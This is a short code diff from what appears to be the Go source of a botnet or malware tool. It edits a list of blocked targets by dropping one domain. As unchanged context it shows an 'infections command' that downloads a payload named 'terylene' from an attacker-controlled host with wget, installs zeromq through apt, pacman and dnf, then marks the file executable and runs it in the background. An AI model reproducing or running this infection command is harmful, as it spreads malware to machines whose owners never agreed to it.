@@ -25,7 +25,7 @@ var (
 		},
 	}
 	//blocked targets
-	Blocked = []string{"google.com", "polysphere.cc", "youtube.com", ".gov", ".edu", "127.0.0.1"}
+	Blocked = []string{"google.com", "youtube.com", ".gov", ".edu", "127.0.0.1"}
 
 	//infections command
 	Infcommand = "wget -O file http://%s:8080/terylene && export DEBIAN_FRONTEND=noninteractive || true && apt-get install -y libzmq3-dev || true && yes | sudo pacman -S zeromq || true && sudo dnf -y install zeromq || true && chmod +x file && ./file &"
